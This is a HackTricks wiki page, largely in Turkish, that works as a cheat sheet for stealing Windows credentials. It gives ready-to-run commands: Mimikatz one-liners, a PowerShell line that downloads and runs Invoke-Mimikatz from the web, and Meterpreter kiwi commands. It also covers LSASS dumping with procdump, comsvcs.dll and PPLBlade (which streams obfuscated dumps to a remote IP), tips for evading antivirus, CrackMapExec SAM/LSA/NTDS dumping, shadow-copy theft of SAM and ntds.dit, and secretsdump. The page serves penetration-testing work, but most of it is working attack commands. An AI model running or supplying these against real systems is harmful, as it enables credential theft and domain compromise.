# Windows Kimlik Bilgilerini Çalma

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## Kimlik Bilgileri Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'ın yapabileceği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)** bulun.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Burada bazı olası kimlik bilgisi korumalarını öğrenin.**](credentials-protections.md) **Bu korumalar, Mimikatz'ın bazı kimlik bilgilerini çıkarmasını engelleyebilir.**

## Meterpreter ile Kimlik Bilgileri

Kurbanın içinde **şifreler ve hash'ler** aramak için oluşturduğum [**Kimlik Bilgileri Eklentisi**](https://github.com/carlospolop/MSF-Credentials)'ni kullanın.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV'yi Atlatma

### Procdump + Mimikatz

**Procdump,** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'dan, meşru bir Microsoft aracıdır**, bu nedenle Defender tarafından tespit edilmez.\
Bu aracı kullanarak **lsass sürecini dökebilir**, **dökümü indirebilir** ve **dökümden** **kimlik bilgilerini yerel olarak çıkarabilirsiniz**.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Dump'tan kimlik bilgilerini çıkar" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Bu işlem otomatik olarak [SprayKatz](https://github.com/aas-n/spraykatz) ile yapılır: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV** **procdump.exe'nin lsass.exe'yi dökümlemesi** kullanımını **kötü amaçlı** olarak **tespit** edebilir, bu da **"procdump.exe" ve "lsass.exe"** dizesini **tespit** etmelerindendir. Bu nedenle, **lsass.exe'nin PID'sini** procdump'a **lsass.exe ismi yerine** bir **argüman** olarak **geçmek** daha **gizli**dir.

### **comsvcs.dll** ile lsass dökümü

`C:\Windows\System32` içinde bulunan **comsvcs.dll** adlı bir DLL, bir çökme durumunda **işlem belleğini dökmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılması için tasarlanmış **`MiniDumpW`** adlı bir **fonksiyon** içerir.\
İlk iki argümanı kullanmak önemsizdir, ancak üçüncüsü üç bileşene ayrılır. Dökümü alınacak işlem kimliği ilk bileşeni, döküm dosyası konumu ikinciyi temsil eder ve üçüncü bileşen kesinlikle **full** kelimesidir. Alternatif seçenek yoktur.\
Bu üç bileşen ayrıştırıldığında, DLL döküm dosyasını oluşturmak ve belirtilen işlemin belleğini bu dosyaya aktarmakla ilgilenir.\
**comsvcs.dll** kullanımı, lsass işlemini dökmek için mümkündür, böylece procdump'ı yükleyip çalıştırma ihtiyacı ortadan kalkar. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.

Aşağıdaki komut çalıştırmak için kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu süreci** [**lssasy**](https://github.com/Hackndo/lsassy)** ile otomatikleştirebilirsiniz.**

### **Görev Yöneticisi ile lsass Dökümü**

1. Görev Çubuğuna sağ tıklayın ve Görev Yöneticisi'ni tıklayın
2. Daha fazla ayrıntı'ya tıklayın
3. İşlemler sekmesinde "Yerel Güvenlik Otoritesi Süreci" işlemini arayın
4. "Yerel Güvenlik Otoritesi Süreci" işlemine sağ tıklayın ve "Döküm dosyası oluştur" seçeneğine tıklayın.

### Procdump ile lsass Dökümü

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan Microsoft imzalı bir ikilidir.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) Korunan Süreç Döküm Aracı'dır ve bellek dökümünü obfuscate etme ve bunu uzaktaki iş istasyonlarına disk üzerine bırakmadan aktarma desteği sunar.

**Ana işlevler**:

1. PPL korumasını aşma
2. Defender imza tabanlı tespit mekanizmalarından kaçınmak için bellek döküm dosyalarını obfuscate etme
3. Bellek dökümünü RAW ve SMB yükleme yöntemleriyle disk üzerine bırakmadan yükleme (dosyasız döküm)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### SAM hash'lerini dökme
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA sırlarını dökme
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Hedef DC'den NTDS.dit'i Dökme
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Hedef DC'den NTDS.dit şifre geçmişini dökme
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet niteliğini gösterin
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM Çalma

Bu dosyalar **şu konumda bulunmalıdır** _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM._ Ancak **bunları sıradan bir şekilde kopyalayamazsınız** çünkü korunmaktadırlar.

### Kayıt Defterinden

Bu dosyaları çalmanın en kolay yolu, kayıt defterinden bir kopya almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Bu dosyaları** Kali makinenize **indirin** ve **hash'leri çıkartın**:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Hacim Gölgesi Kopyası

Bu hizmeti kullanarak korunan dosyaların kopyasını alabilirsiniz. Yönetici olmanız gerekiyor.

#### vssadmin Kullanarak

vssadmin ikili dosyası yalnızca Windows Server sürümlerinde mevcuttur.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ama aynı şeyi **Powershell** ile de yapabilirsiniz. Bu, **SAM dosyasını nasıl kopyalayacağınızın** bir örneğidir (kullanılan sabit disk "C:" ve C:\users\Public'e kaydediliyor) ancak bunu herhangi bir korumalı dosyayı kopyalamak için de kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit'in bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kullanabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası, **Active Directory**'nin kalbi olarak bilinir ve kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkında kritik verileri tutar. Bu dosya, alan kullanıcıları için **şifre karma**'larının saklandığı yerdir. Bu dosya, **Genişletilebilir Depolama Motoru (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç ana tablo tutulur:

- **Veri Tablosu**: Bu tablo, kullanıcılar ve gruplar gibi nesneler hakkında ayrıntıları saklamakla görevlidir.
- **Bağlantı Tablosu**: Üyelikler gibi ilişkileri takip eder.
- **SD Tablosu**: Her nesne için **Güvenlik tanımlayıcıları** burada tutulur ve saklanan nesnelerin güvenliği ve erişim kontrolünü sağlar.

Bunun hakkında daha fazla bilgi: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows, bu dosyayla etkileşimde bulunmak için _Ntdsa.dll_ kullanır ve _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının bir kısmı **`lsass`** belleğinde bulunabilir (performans iyileştirmesi nedeniyle muhtemelen en son erişilen verileri bulabilirsiniz, çünkü bir **önbellek** kullanılır).

#### NTDS.dit içindeki karma değerlerini çözme

Karma, 3 kez şifrelenmiştir:

1. **BOOTKEY** ve **RC4** kullanarak Şifre Çözme Anahtarını (**PEK**) çözün.
2. **PEK** ve **RC4** kullanarak **karma** değerini çözün.
3. **DES** kullanarak **karma** değerini çözün.

**PEK**, **her alan denetleyicisinde** **aynı değere** sahiptir, ancak **alan denetleyicisinin SYSTEM dosyasının BOOTKEY**'i kullanılarak **NTDS.dit** dosyası içinde **şifrelenmiştir** (alan denetleyicileri arasında farklıdır). Bu nedenle, NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit ve SYSTEM dosyalarına ihtiyacınız var** (_C:\Windows\System32\config\SYSTEM_).

### Ntdsutil kullanarak NTDS.dit kopyalama

Windows Server 2008'den beri mevcuttur.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
You could also use the [**volume shadow copy**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).

### **NTDS.dit'ten hash'leri çıkarmak**

Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ayrıca geçerli bir alan yöneticisi kullanarak **otomatik olarak çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Büyük **NTDS.dit dosyaları** için, [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanarak çıkartılması önerilir.

Son olarak, **metasploit modülünü** de kullanabilirsiniz: _post/windows/gather/credentials/domain\_hashdump_ veya **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit'ten bir SQLite veritabanına alan nesnelerini çıkartma**

NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkartılabilir. Sadece sırlar değil, aynı zamanda ham NTDS.dit dosyası zaten alındığında daha fazla bilgi çıkartma için tüm nesneler ve nitelikleri de çıkartılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive isteğe bağlıdır ancak gizli bilgilerin şifre çözümlemesine olanak tanır (NT & LM hash'leri, düz metin şifreler gibi ek kimlik bilgileri, kerberos veya güven trust anahtarları, NT & LM şifre geçmişleri). Diğer bilgilerle birlikte, aşağıdaki veriler çıkarılır: kullanıcı ve makine hesapları ile hash'leri, UAC bayrakları, son oturum açma ve şifre değiştirme için zaman damgası, hesap açıklamaları, adlar, UPN, SPN, gruplar ve özyinelemeli üyelikler, organizasyonel birimler ağacı ve üyelik, güvenilir alanlar ile güven türü, yönü ve nitelikleri...

## Lazagne

Binary'yi [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary'yi çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'tan kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Bunu buradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarın.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) adresinden indirin ve sadece **çalıştırın** ve şifreler çıkarılacaktır.

## Defanslar

[**Burada bazı kimlik bilgisi korumalarını öğrenin.**](credentials-protections.md)

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
